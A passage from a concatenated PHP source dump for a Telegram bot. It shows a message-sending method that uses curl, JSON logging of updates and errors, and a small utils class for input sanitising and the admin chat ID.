            ];

            if (isset($options['reply_markup'])) {
                $data['reply_markup'] = json_encode($options['reply_markup']);
            }

            if (isset($options['photo'])) {
                $data['photo'] = $options['photo'];
            }

            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => Config::$COMMAND_TIMEOUT
            ]);
            $response = curl_exec($ch);
            curl_close($ch);
        } catch (Exception $e) {
            Utils::log_error("Error in send_telegram_message: " . $e->getMessage());
        }
    }

    private static function log_update($update, $message = '')
    {
        $log_entry = [
            'time' => date('Y-m-d H:i:s'),
            'message' => $message,
            'update' => $update
        ];
        file_put_contents(Config::$TELEGRAM_LOG, json_encode($log_entry, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
    }
}


----------------------------------------
File: .\utils.php
----------------------------------------
<?php
require_once 'config.php';

class Utils {
    public static function sanitize_input($input) {
        return htmlspecialchars(strip_tags(trim($input)));
    }

    public static function get_admin_chat_id($pdo) {
        return Config::$ADMIN_CHAT_ID;
    }

    public static function log_error($message) {
        $log_entry = [
            'time' => date('Y-m-d H:i:s'),
            'message' => $message
        ];
        file_put_contents(Config::$ERROR_LOG, json_encode($log_entry, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
    }
}
?>
